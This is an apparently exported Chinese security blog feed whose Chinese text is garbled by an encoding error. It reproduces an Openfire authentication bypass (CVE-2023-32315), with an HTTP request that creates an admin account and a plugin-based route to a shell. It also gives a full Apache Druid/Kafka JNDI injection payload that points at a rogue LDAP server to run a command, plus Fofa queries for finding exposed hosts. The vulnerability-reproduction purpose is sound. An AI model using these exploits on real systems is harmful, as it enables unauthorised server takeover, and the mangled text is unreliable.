href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a></p><blockquote><p>é€šè¿‡æœç´¢å¼•æ“ã€PGPæœåŠ¡å™¨ä»¥åŠSHODANæ•°æ®åº“æ”¶é›†ç”¨æˆ·çš„emailï¼Œå­åŸŸåï¼Œä¸»æœºï¼Œé›‡å‘˜åï¼Œå¼€æ”¾ç«¯å£å’Œbannerä¿¡æ¯ã€‚</p></blockquote></li><li><p>ç”Ÿæˆç¤¾å·¥å­—å…¸ï¼Œè¿›è¡Œå£ä»¤çˆ†ç ´</p><p><a href="https://github.com/zgjx6/SocialEngineeringDictionaryGenerator">https://github.com/zgjx6/SocialEngineeringDictionaryGenerator</a></p></li></ul><h1 id="æŒ‡çº¹è¯†åˆ«"><a href="#æŒ‡çº¹è¯†åˆ«" class="headerlink" title="æŒ‡çº¹è¯†åˆ«"></a>æŒ‡çº¹è¯†åˆ«</h1><h2 id="ä¸ºä»€ä¹ˆ-3"><a href="#ä¸ºä»€ä¹ˆ-3" class="headerlink" title="ä¸ºä»€ä¹ˆ"></a>ä¸ºä»€ä¹ˆ</h2><ul><li><p><strong>ç­›é€‰å‡ºæœ€å¯èƒ½æœ‰æ¼æ´çš„ç‚¹</strong></p></li><li><p><strong>è¯†åˆ«waf</strong></p></li></ul><h2 id="æŒ‡çº¹è¯†åˆ«-1"><a href="#æŒ‡çº¹è¯†åˆ«-1" class="headerlink" title="æŒ‡çº¹è¯†åˆ«"></a>æŒ‡çº¹è¯†åˆ«</h2><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p><a href="https://github.com/TideSec/TideFinger/blob/master/Web%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6%E4%B8%8E%E4%BC%98%E5%8C%96%E5%AE%9E%E7%8E%B0.md">TideFinger&#x2F;WebæŒ‡çº¹è¯†åˆ«æŠ€æœ¯ç ”ç©¶ä¸ä¼˜åŒ–å®ç°.md at master Â· TideSec&#x2F;TideFinger</a></p><h3 id="Webåº”ç”¨æ¡†æ¶"><a href="#Webåº”ç”¨æ¡†æ¶" class="headerlink" title="Webåº”ç”¨æ¡†æ¶"></a>Webåº”ç”¨æ¡†æ¶</h3><h4 id="å·¥å…·-2"><a href="#å·¥å…·-2" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h4><ul><li><p><a href="https://github.com/TideSec/TideFinger">https://github.com/TideSec/TideFinger</a></p><p><img src="/../images/image-20230511175807888-1685533751889.png" alt="image-20230511175807888"></p></li><li><p><a href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a></p><p><img src="/../images/image-20230511110926338-1685533751889.png" alt="image-20230511110926338"></p></li></ul><h4 id="åœ¨çº¿ç½‘ç«™"><a href="#åœ¨çº¿ç½‘ç«™" class="headerlink" title="åœ¨çº¿ç½‘ç«™"></a>åœ¨çº¿ç½‘ç«™</h4><ul><li><p><a href="https://fp.shuziguanxing.com/#/">æŒ‡çº¹æ”¶å½•å¹³å°</a></p></li><li><p><a href="http://www.yunsee.cn/">äº‘æ‚‰äº’è”ç½‘WEBèµ„äº§åœ¨çº¿æ¢³ç†|åœ¨çº¿CMSæŒ‡çº¹è¯†åˆ«å¹³å° - äº‘æ‚‰å®‰å…¨å¹³å°</a>ï¼ˆè¦æ³¨å†Œ,æœ‰ä¸€å®šé—¨æ§›ï¼‰</p></li><li><p><a href="http://finger.tidesec.com/">http://finger.tidesec.com/</a></p></li></ul><h4 id="æµè§ˆå™¨æ’ä»¶"><a href="#æµè§ˆå™¨æ’ä»¶" class="headerlink" title="æµè§ˆå™¨æ’ä»¶"></a>æµè§ˆå™¨æ’ä»¶</h4><p>Wappalyzer</p><h4 id="æ‰‹å·¥"><a href="#æ‰‹å·¥" class="headerlink" title="æ‰‹å·¥"></a>æ‰‹å·¥</h4><ul><li>å‰ç«¯jsä»£ç ï¼Œæ–‡ä»¶åï¼Œè·¯å¾„ç­‰æ”¾åˆ°githubï¼Œgiteeæœ</li><li>iconä¿¡æ¯ç­‰æ”¾åˆ°ç©ºé—´æœç´¢å¼•æ“</li><li>å›¾ç‰‡æœç´¢ï¼ˆä¸è¿‡é€šå¸¸ä¼šè¿›è¡Œæ›¿æ¢ï¼‰</li><li>ç‰ˆæƒæ ‡è¯†å¦‚urlï¼Œlogoç­‰ï¼ˆæ³¨é‡Šæˆ–è€…åˆ é™¤äº†ï¼‰</li></ul><h3 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h3><ul><li><p>æŸ¥çœ‹è¿”å›åŒ…æœ‰æ— WAFå­—æ ·</p><p><img src="/../images/image-20230511233014884-1685533751889.png" alt="image-20230511233014884"></p></li><li><p><a href="https://github.com/EnableSecurity/wafw00f">WAFW00F </a></p></li><li><p>æŸ¥çœ‹æ‹¦æˆªé¡µé¢ä¿¡æ¯</p><blockquote><p>é€šè¿‡ä¸€äº›æ˜æ˜¾çš„æ³¨å…¥æ¥è§¦å‘waf</p></blockquote><p><a href="https://cloud.tencent.com/developer/beta/article/1872310">83ä¸ªWafæ‹¦æˆªé¡µé¢-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘</a>  ï¼ˆ5å¹´å‰ï¼‰</p><p><a href="https://mp.weixin.qq.com/s/8F060FU9g_78z57UKS-JsQ">30å‡ æ¬¾å¸¸è§WAFçš„æ‹¦æˆªé¡µæ•´ç†</a>   ï¼ˆ2021å¹´ï¼‰</p></li></ul><h3 id="èœœç½"><a href="#èœœç½" class="headerlink" title="èœœç½"></a>èœœç½</h3><p><a href="https://github.com/cnrstar/anti-honeypot">https://github.com/cnrstar/anti-honeypot</a></p><p><a href="https://send-safe-honeypot-hunter.apponic.com/">https://send-safe-honeypot-hunter.apponic.com/</a></p><h1 id="æ¼æ´æ¢æµ‹ä¸åˆ©ç”¨"><a href="#æ¼æ´æ¢æµ‹ä¸åˆ©ç”¨" class="headerlink" title="æ¼æ´æ¢æµ‹ä¸åˆ©ç”¨"></a>æ¼æ´æ¢æµ‹ä¸åˆ©ç”¨</h1><h2 id="æ¼æ‰«å·¥å…·"><a href="#æ¼æ‰«å·¥å…·" class="headerlink" title="æ¼æ‰«å·¥å…·"></a>æ¼æ‰«å·¥å…·</h2><h2 id="æ‰‹å·¥æµ‹è¯•"><a href="#æ‰‹å·¥æµ‹è¯•" class="headerlink" title="æ‰‹å·¥æµ‹è¯•"></a>æ‰‹å·¥æµ‹è¯•</h2><h1 id="åæ¸—é€"><a href="#åæ¸—é€" class="headerlink" title="åæ¸—é€"></a>åæ¸—é€</h1><h1 id="å¾…åš"><a href="#å¾…åš" class="headerlink" title="å¾…åš"></a>å¾…åš</h1><blockquote><p>æŠŠä¸Šé¢çš„å‡ ä¸ªæ­¥éª¤ï¼Œå·¥å…·ä¸²èµ·æ¥ï¼Œè¡Œæˆå¿«é€Ÿä¿¡æ¯æ”¶é›†ï¼Œå¿«é€Ÿæ¢æµ‹æ‰“ç‚¹ï¼Œæœ€å¥½å†™ä¸ªè´¯ç©¿æµç¨‹çš„å·¥å…·è°ƒç”¨çš„è„šæœ¬ã€‚</p></blockquote><p>å‚è€ƒï¼š</p><p><a href="https://www.se7ensec.cn/2023/02/14/%E8%87%AA%E5%8A%A8%E5%8C%96%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%9E%E7%8E%B0/">https://www.se7ensec.cn/2023/02/14/%E8%87%AA%E5%8A%A8%E5%8C%96%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%9E%E7%8E%B0/</a></p><p><a href="https://github.com/ybdt/info-hub">ybdt&#x2F;info-hub: èµ„äº§æ”¶é›†ã€æŒ‡çº¹è¯†åˆ«</a></p><h1 id="äº§å‡ºæŠ¥å‘Š"><a href="#äº§å‡ºæŠ¥å‘Š" class="headerlink" title="äº§å‡ºæŠ¥å‘Š"></a>äº§å‡ºæŠ¥å‘Š</h1><p><a href="https://www.anquanke.com/post/id/215031#h3-5">å¦‚ä½•ç¼–å†™ä¸€ä»½ä¸“ä¸šçš„æ¸—é€æµ‹è¯•æŠ¥å‘Š-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å°</a></p><p><a href="https://github.com/Potato-py/ExportReport">Potato-py&#x2F;ExportReport: æœ¬é¡¹ç›®ç”¨äºè‡ªåŠ¨åŒ–ç”ŸæˆæŠ¥å‘Šã€‚å¯æ ¹æ®é¡¹ç›®éœ€æ±‚ï¼Œé€šè¿‡ç®€å•çš„æå–å˜é‡æ¥è‡ªå®šä¹‰æŠ¥å‘Šæ¨¡æ¿ã€‚å†…é™„å¸¸è§æ‰«æå™¨API&#x2F;åŸæŠ¥å‘Š(awvsã€xrayã€goby)æ•°æ®æå–æ¨¡å—ï¼Œå¯ç›´æ¥ç”Ÿæˆå…¨æ–°çš„è‡ªå®šä¹‰æŠ¥å‘Šã€‚ å¯¹æœ‰å¤æ‚çš„åŠŸèƒ½éœ€æ±‚æ—¶ï¼Œé€‚ç”¨äºæœ‰PythonåŸºç¡€çš„äººä½¿ç”¨ã€‚ æœ¬é¡¹ç›®å†…é™„äºŒæ¬¡å¼€å‘æ‰€ç”¨çš„èµ„æ–™æ–‡æ¡£ï¼Œæ¬¢è¿å„ä½æPull Request</a></p><p><a href="https://github.com/awake1t/HackReport/tree/main/01-%E6%8A%A5%E5%91%8A%E6%A8%A1%E6%9D%BF">HackReport&#x2F;01-æŠ¥å‘Šæ¨¡æ¿ at main Â· awake1t&#x2F;HackReport</a></p><p><strong>ä¿®å¤å»ºè®®â€“æ¸—é€æµ‹è¯•ä¿®å¤å»ºè®®æ€»ç»“.pdf</strong></p><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://blog.gm7.org/">Introduction </a></p><p><a href="https://gitbook.se7ensec.cn/#duan-kou-sao-miao">åœ¨çº¿å·¥å…· - è‚¾é€æµ‹è¯•ä¸­å¿ƒ</a></p><p><a href="https://gitbook.se7ensec.cn/hong-dui-zuo-zhan-shou-ce#liu-cheng-jian-yao-shuo-ming">çº¢é˜Ÿä½œæˆ˜æ‰‹å†Œ - è‚¾é€æµ‹è¯•ä¸­å¿ƒ</a></p><p><a href="https://github.com/bin-maker/BYPASS-CDN/">https://github.com/bin-maker/BYPASS-CDN/</a></p><p><a href="https://www.secpulse.com/archives/194410.html">https://www.secpulse.com/archives/194410.html</a></p><p><a href="https://wiki.wgpsec.org/knowledge/">ç‹¼ç»„å®‰å…¨å›¢é˜Ÿå…¬å¼€çŸ¥è¯†åº“</a></p><p><a href="https://www.wangan.com/p/7fy7fy135d85fec8">https://www.wangan.com/p/7fy7fy135d85fec8</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Openfireèº«ä»½è®¤è¯ç»•è¿‡+æ’ä»¶Getshellæ¼æ´å¤ç°</title>
      <link href="/2023/06/25/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Openfire/"/>
      <url>/2023/06/25/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Openfire/</url>
      
        <content type="html"><![CDATA[<h2 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>â€‹Openfireçš„ç®¡ç†æ§åˆ¶å°æ˜¯ä¸€ä¸ªåŸºäº Web çš„åº”ç”¨ç¨‹åºï¼Œè¢«å‘ç°å¯ä»¥ä½¿ç”¨UTF-16å­—ç¬¦æ¥ç»•è¿‡è·¯å¾„ç©¿è¶Šçš„é˜²æŠ¤ï¼Œä»è€Œä»¥è·¯å¾„éå†çš„æ–¹å¼ç»•è¿‡æƒé™æ ¡éªŒã€‚æˆåŠŸåˆ©ç”¨åï¼Œæœªç»èº«ä»½éªŒè¯çš„ç”¨æˆ·å¯ä»¥è®¿é—® Openfire ç®¡ç†æ§åˆ¶å°ä¸­çš„åå°é¡µé¢ã€‚</p><p>â€‹åŒæ—¶ç”±äºOpenfireç®¡ç†æ§åˆ¶å°çš„åå°æä¾›äº†å®‰è£…æ’ä»¶çš„åŠŸèƒ½ï¼Œæ‰€ä»¥æ”»å‡»è€…å¯ä»¥é€šè¿‡å®‰è£…æ¶æ„æ’ä»¶è¾¾æˆè¿œç¨‹ä»£ç æ‰§è¡Œçš„æ•ˆæœ</p><h2 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p> 3.10.0 &lt;&#x3D; Openfire &lt; 4.6.8</p><p> 4.7.0 &lt;&#x3D; Openfire 4.7.x &lt; 4.7.5</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><ul><li><p>vulhub</p></li><li><p>Fofaè¯­æ³•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;Openfire&quot;   49,485 æ¡åŒ¹é…ç»“æœ ( 23,657 æ¡ç‹¬ç«‹IP )</span><br></pre></td></tr></table></figure></li></ul><h2 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><h3 id="åˆ›å»ºç”¨æˆ·"><a href="#åˆ›å»ºç”¨æˆ·" class="headerlink" title="åˆ›å»ºç”¨æˆ·"></a>åˆ›å»ºç”¨æˆ·</h3><p>å·¥å…·</p><p><a href="https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass">https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go run main.go -u http://openfire.com:9090</span><br><span class="line"></span><br><span class="line">go run main.go -l url.txt -t 20</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230625225708359.png" alt="image-20230625225708359"></p><p>æ‰‹åŠ¨</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET /setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=csrftoken&amp;username=hackme&amp;name=&amp;email=&amp;password=hackme&amp;passwordConfirm=hackme&amp;isadmin=on&amp;create=Create+User</span><br></pre></td></tr></table></figure><p>åˆ›å»ºäº†ä¸€ä¸ªç”¨æˆ·åä¸å¯†ç å‡ä¸ºhackmeçš„ç”¨æˆ·</p><h3 id="æ’ä»¶getshell"><a href="#æ’ä»¶getshell" class="headerlink" title="æ’ä»¶getshell"></a>æ’ä»¶getshell</h3><p>ä½¿ç”¨å¢åŠ çš„ç”¨æˆ·è¿›å…¥åå°</p><p><img src="/../images/image-20230625224759596.png" alt="image-20230625224759596"></p><p>ä¸Šä¼ æ’ä»¶<a href="https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass/releases/download/v0.1/org.jivesoftware.openfire.plugin.CVE-openfire-plugin-assembly.jar%EF%BC%8C%E6%9D%A5%E5%88%B0server">https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass/releases/download/v0.1/org.jivesoftware.openfire.plugin.CVE-openfire-plugin-assembly.jarï¼Œæ¥åˆ°server</a> settings</p><p><img src="/../images/image-20230625224848522.png" alt="image-20230625224848522"></p><p>è¾“å…¥å¯†ç å</p><p><img src="/../images/image-20230625224924825.png" alt="image-20230625224924825"></p><h2 id="æ¼æ´æ£€æµ‹"><a href="#æ¼æ´æ£€æµ‹" class="headerlink" title="æ¼æ´æ£€æµ‹"></a>æ¼æ´æ£€æµ‹</h2><p>æ‰‹åŠ¨</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET /setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230625230442265.png" alt="image-20230625230442265"></p><p>nuclei</p><p><img src="/../images/image-20230625231354247.png" alt="image-20230625231354247"></p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>å‡çº§ç‰ˆæœ¬è‡³<strong>4.6.8æˆ–4.7.5åŠä»¥ä¸Š</strong></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Apache Druid RCEæ¼æ´å¤ç°(QVD-2023-9629)</title>
      <link href="/2023/06/24/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache%20Druid/"/>
      <url>/2023/06/24/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache%20Druid/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p><a href="https://github.com/vulhub/vulhub/tree/master">vulhub</a>&#x2F;<a href="https://github.com/vulhub/vulhub/tree/master/kafka">kafka</a>&#x2F;<a href="https://github.com/vulhub/vulhub/tree/master/kafka/CVE-2023-25194">CVE-2023-25194</a></p><p><img src="/../images/image-20230624162154282.png" alt="image-20230624162154282"></p><h2 id="Fofaè¯­æ³•"><a href="#Fofaè¯­æ³•" class="headerlink" title="Fofaè¯­æ³•"></a>Fofaè¯­æ³•</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=&quot;Apache Druid&quot;         866 æ¡</span><br><span class="line">js_name=&quot;console-config.js&quot;   850 æ¡</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>Apache Kafka clientsä¸­å­˜åœ¨ä¸€å¤„<strong>JNDIæ³¨å…¥</strong>æ¼æ´ã€‚å¦‚æœæ”»å‡»è€…åœ¨è¿æ¥çš„æ—¶å€™å¯ä»¥æ§åˆ¶å±æ€§<code>sasl.jaas.config</code>çš„å€¼ä¸º<code>com.sun.security.auth.module.JndiLoginModule</code>ï¼Œåˆ™å¯ä»¥å‘èµ·JNDIè¿æ¥ï¼Œè¿›è€Œå¯¼è‡´JNDIæ³¨å…¥æ¼æ´ï¼Œ<strong>æ‰§è¡Œä»»æ„å‘½ä»¤</strong>ã€‚</p><h2 id="å½±å“ç‰ˆæœ¬å’Œè½¯ä»¶"><a href="#å½±å“ç‰ˆæœ¬å’Œè½¯ä»¶" class="headerlink" title="å½±å“ç‰ˆæœ¬å’Œè½¯ä»¶"></a>å½±å“ç‰ˆæœ¬å’Œè½¯ä»¶</h2><p>2.3.0 &lt;&#x3D; Apache Kafka &lt;&#x3D; 3.3.2</p><p>ä½¿ç”¨Apache Kafkaçš„è½¯ä»¶<strong>Apache Druid</strong></p><blockquote><p>Apache Druidæ˜¯ä¸€ä¸ªé«˜æ€§èƒ½çš„å®æ—¶å¤§æ•°æ®åˆ†æå¼•æ“ï¼Œæ”¯æŒå¿«é€Ÿæ•°æ®æ‘„å–ã€å®æ—¶æŸ¥è¯¢å’Œæ•°æ®å¯è§†åŒ–ã€‚å®ƒä¸»è¦ç”¨äºOLAPï¼ˆåœ¨çº¿åˆ†æå¤„ç†ï¼‰åœºæ™¯ï¼Œèƒ½å¤„ç†PBçº§åˆ«çš„æ•°æ®ã€‚Druidå…·æœ‰é«˜åº¦å¯æ‰©å±•ã€ä½å»¶è¿Ÿå’Œé«˜ååé‡çš„ç‰¹ç‚¹ï¼Œå¹¿æ³›åº”ç”¨äºå®æ—¶ç›‘æ§ã€äº‹ä»¶é©±åŠ¨åˆ†æã€ç”¨æˆ·è¡Œä¸ºåˆ†æã€ç½‘ç»œå®‰å…¨ç­‰é¢†åŸŸã€‚é€šè¿‡ä½¿ç”¨Druidï¼Œä¼ä¸šå’Œå¼€å‘è€…å¯ä»¥å¿«é€Ÿè·å¾—å®æ—¶åˆ†æç»“æœï¼Œæå‡å†³ç­–æ•ˆç‡ã€‚</p><p>è¯¥åº”ç”¨çš„å†å²æ¼æ´ï¼š</p><h5 id="Apache-Druid-JDBCååºåˆ—åŒ–ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2021-26919ï¼‰"><a href="#Apache-Druid-JDBCååºåˆ—åŒ–ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2021-26919ï¼‰" class="headerlink" title="Apache Druid JDBCååºåˆ—åŒ–ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2021-26919ï¼‰"></a>Apache Druid JDBCååºåˆ—åŒ–ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2021-26919ï¼‰</h5><h5 id="Apache-Druid-log4j-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"><a href="#Apache-Druid-log4j-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="Apache Druid log4j è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"></a>Apache Druid log4j è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</h5><p><strong>æœªæˆæƒè®¿é—®æ¼æ´</strong></p></blockquote><p><strong>å½±å“ç‰ˆæœ¬0.19.0 &lt;&#x3D; Apache Druid &lt;&#x3D; 25.0.0</strong></p><h2 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><p>å¼€å¯ldapæœåŠ¡</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-1.1-SNAPSHOT.jar -i 124.220.192.120</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230624155944899.png" alt="image-20230624155944899"></p><p>å‘é€payloadï¼Œæ›¿æ¢å…¶ä¸­çš„LDAP URL</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/druid/indexer/v1/sampler?for=connect</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>your-ip:8888</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line"><span class="language-swift">&#123;</span></span><br><span class="line"><span class="language-swift">    <span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span>,</span></span><br><span class="line"><span class="language-swift">    <span class="string">&quot;spec&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">        <span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span>,</span></span><br><span class="line"><span class="language-swift">        <span class="string">&quot;ioConfig&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span>,</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;consumerProperties&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;bootstrap.servers&quot;</span>:<span class="string">&quot;127.0.0.1:6666&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;sasl.mechanism&quot;</span>:<span class="string">&quot;SCRAM-SHA-256&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;security.protocol&quot;</span>:<span class="string">&quot;SASL_SSL&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;sasl.jaas.config&quot;</span>:<span class="string">&quot;com.sun.security.auth.module.JndiLoginModule required user.provider.url=<span class="subst">\&quot;</span>ldap://roguo-jndi-server:1389/Basic/Command/base64/aWQgPiAvdG1wL3N1Y2Nlc3M=<span class="subst">\&quot;</span> useFirstPass=<span class="subst">\&quot;</span>true<span class="subst">\&quot;</span> serviceName=<span class="subst">\&quot;</span>x<span class="subst">\&quot;</span> debug=<span class="subst">\&quot;</span>true<span class="subst">\&quot;</span> group.provider.url=<span class="subst">\&quot;</span>xxx<span class="subst">\&quot;</span>;&quot;</span></span></span><br><span class="line"><span class="language-swift">            &#125;,</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;topic&quot;</span>:<span class="string">&quot;test&quot;</span>,</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;useEarliestOffset&quot;</span>:<span class="literal">true</span>,</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;inputFormat&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;type&quot;</span>:<span class="string">&quot;regex&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;pattern&quot;</span>:<span class="string">&quot;([<span class="subst">\\</span>s<span class="subst">\\</span>S]*)&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;listDelimiter&quot;</span>:<span class="string">&quot;56616469-6de2-9da4-efb8-8f416e6e6965&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;columns&quot;</span>:[</span></span><br><span class="line"><span class="language-swift">                    <span class="string">&quot;raw&quot;</span></span></span><br><span class="line"><span class="language-swift">                ]</span></span><br><span class="line"><span class="language-swift">            &#125;</span></span><br><span class="line"><span class="language-swift">        &#125;,</span></span><br><span class="line"><span class="language-swift">        <span class="string">&quot;dataSchema&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;dataSource&quot;</span>:<span class="string">&quot;sample&quot;</span>,</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;timestampSpec&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;column&quot;</span>:<span class="string">&quot;!!!_no_such_column_!!!&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;missingValue&quot;</span>:<span class="string">&quot;1970-01-01T00:00:00Z&quot;</span></span></span><br><span class="line"><span class="language-swift">            &#125;,</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;dimensionsSpec&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift"></span></span><br><span class="line"><span class="language-swift">            &#125;,</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;granularitySpec&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;rollup&quot;</span>:<span class="literal">false</span></span></span><br><span class="line"><span class="language-swift">            &#125;</span></span><br><span class="line"><span class="language-swift">        &#125;,</span></span><br><span class="line"><span class="language-swift">        <span class="string">&quot;tuningConfig&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span></span></span><br><span class="line"><span class="language-swift">        &#125;</span></span><br><span class="line"><span class="language-swift">    &#125;,</span></span><br><span class="line"><span class="language-swift">    <span class="string">&quot;samplerConfig&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">        <span class="string">&quot;numRows&quot;</span>:<span class="number">500</span>,</span></span><br><span class="line"><span class="language-swift">        <span class="string">&quot;timeoutMs&quot;</span>:<span class="number">15000</span></span></span><br><span class="line"><span class="language-swift">    &#125;</span></span><br><span class="line"><span class="language-swift">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230624155828710.png" alt="image-20230624155828710"></p><p><img src="/../images/image-20230624155800506.png" alt="image-20230624155800506"></p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><ul><li><p>ä¸ºApache Druid å¼€å¯è®¤è¯é…ç½®ã€‚</p><p><a href="https://druid.apache.org/docs/latest/development/extensions-core/druid-basic-security.html">https://druid.apache.org/docs/latest/development/extensions-core/druid-basic-security.html</a></p></li><li><p>å‡çº§ç‰ˆæœ¬</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Springæ¡†æ¶æ¼æ´</title>
      <link href="/2023/06/22/spring%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/06/22/spring%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
